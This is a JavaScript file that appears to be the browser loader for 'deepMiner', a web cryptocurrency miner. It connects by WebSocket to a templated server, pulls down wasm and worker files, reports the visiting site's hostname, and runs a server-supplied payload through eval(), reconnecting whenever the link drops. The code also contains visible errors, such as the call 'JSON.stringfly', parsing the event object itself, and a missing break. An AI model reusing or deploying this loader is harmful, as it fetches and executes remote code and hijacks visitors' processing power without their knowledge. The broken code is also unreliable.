import {
    setTimeout
} from "timers";

(!window.deepMiner) ? (() => {
    var dpLoader = new WebSocket('wss://%deepMiner_domain%/api');
    var dpFile = {};
    const dpSelect = [{
        "dom": "",
        "name": "",
        "id": "",
        "class": ""
    }];
    dpLoader.onopen = () => {
        res = (s) => {
            var url = window.URL || window.webkitURL || window.mozURL;
            return url.createObjectURL(new Blob([s]));
        };
        dpLoader.send('{"type":"load","params":{}}');
        dpLoader.onmessage = (event) => {
            event = JSON.parse(event);
            switch (event.type) {
                case "file_mem":
                    dpFile.mem = res(event.params.mem);
                    dpLoader.send(JSON.stringfly({
                        "type": "done_mem",
                        "params": dpFile.mem
                    }));
                    break;
                case "file_asm":
                    dpFile.asm = res(event.params.asm);
                    dpLoader.send(JSON.stringfly({
                        "type": "done_asm",
                        "params": dpFile.asm
                    }));
                    break;
                case "file_wsm":
                    dpFile.wsm = res(event.params.wsm);
                    dpLoader.send(JSON.stringfly({
                        "type": "done_wsm",
                        "params": dpFile.wsm
                    }));
                    break;
                case "file_wok":
                    dpFile.wok = res(event.params.wok);
                    dpLoader.send(JSON.stringfly({
                        "type": "done_wok",
                        "params": dpFile.wok
                    }));
                case "file_dpm":
                    dpFile.dpm = event.params.dpm;
                    dpLoader.send(JSON.stringfly({
                        "type": "loaded",
                        "params": {
                            "hostname": document.location.hostname
                        }
                    }));
                    dpLoader.close();
                    break;
                default:
                    dpLoader.close();
                    break;
            };
        };
        dpLoader.onerror = (event) => {
            setTimeout("(() => {dpLoader = new WebSocket('wss://%deepMiner_domain%/api')})()", 5000);
        }
        dpLoader.onclose = (event) => {
            (!dpFile.dpm) ? dpLoader = new WebSocket('wss://%deepMiner_domain%/api'): eval(dpFile.dpm);
        };
    }
})() : null;